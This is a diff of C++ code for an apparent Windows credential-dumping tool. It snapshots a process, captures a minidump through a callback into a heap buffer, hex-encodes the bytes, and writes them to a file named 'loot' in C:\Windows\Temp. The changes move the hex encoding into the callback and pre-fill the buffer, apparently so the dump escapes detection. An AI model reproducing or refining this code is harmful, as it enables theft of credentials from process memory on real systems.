@@ -17,7 +17,7 @@ const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot";
 
 // global callback buffer on heap for minidump
 // could also use CallbackParam in in callback routine
-LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75 * 2);
+LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75*2);
 DWORD bufferSize = 0;
 
 // Windows version table https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw#remarks
@@ -76,8 +76,8 @@ BOOL miniDumpLoot() {
 
 constexpr char hexmap[] = { '0', '1', '2', '3', '4', '5', '6', '7',
 						   '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
-BOOL binToHex(char *out, char *data, DWORD size, DWORD offset=0) {
-	for (int i = offset; i < size; ++i) {
+BOOL binToHex(char *out, char *data, DWORD size) {
+	for (int i = 0; i < size; i++) {
 		out[2 * i] = hexmap[(data[i] & 0xF0) >> 4];
 		out[2 * i + 1] = hexmap[data[i] & 0x0F];
 	}
@@ -107,16 +107,16 @@ BOOL CALLBACK MyMiniDumpWriteDumpCallback(
 			bytesRead = CallbackInput->Io.BufferBytes;
 
 			// get offset for write
-			destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
+			// **does not write sequencially**
+			// **only readable bytes are provided, i.e: unused bytes in memory are not written**
+			destination = (LPVOID)((DWORD_PTR)dumpBuffer + ((DWORD_PTR)CallbackInput->Io.Offset*2));
 
 			// TODO: use callback param instead of global buffer
 			// copy from minidump buffer to global dumpBuffer
-			RtlCopyMemory(destination, source, bytesRead);
-			//binToHex((char*)destination, (char*)source, bytesRead);
+			binToHex((char*)destination, (char*)source, bytesRead);
 
 			// add to total size of dumpBuffer
-			bufferSize += bytesRead;
-			//bufferSize += bytesRead * 2;
+			bufferSize += bytesRead*2;
 			break;
 		case IoFinishCallback:
 			CallbackOutput->Status = S_OK;
@@ -166,6 +166,10 @@ BOOL pssMiniDumpLoot() {
 	//DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
 	if (dwResultCode != ERROR_SUCCESS) return FALSE;
 
+	// initialize buffer with '0' chars, since minidump doesn't write unreadable process memory
+	for (int i = 0; i < 1024 * 1024 * 75 * 2; i++) {
+		((char*)dumpBuffer)[i] = '0';
+	}
 
 	// callback info
 	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
@@ -178,14 +182,9 @@ BOOL pssMiniDumpLoot() {
 	pPFS(GetCurrentProcess(), SnapshotHandle);
 	//PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);
 
-	DWORD hexBytes = bufferSize * 2;
-	LPVOID hexBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, hexBytes);
-	binToHex((char*)hexBuffer, (char*)dumpBuffer, bufferSize);
-
 	// write encoded minidump to file
 	DWORD bytesWritten = 0;
-	WriteFile(hFile, hexBuffer, hexBytes, &bytesWritten, NULL);
-	//WriteFile(hFile, dumpBuffer, bufferSize, &bytesWritten, NULL);
+	WriteFile(hFile, dumpBuffer, bufferSize, &bytesWritten, NULL);
 
 	CloseHandle(hFile);
 	CloseHandle(hProcess);
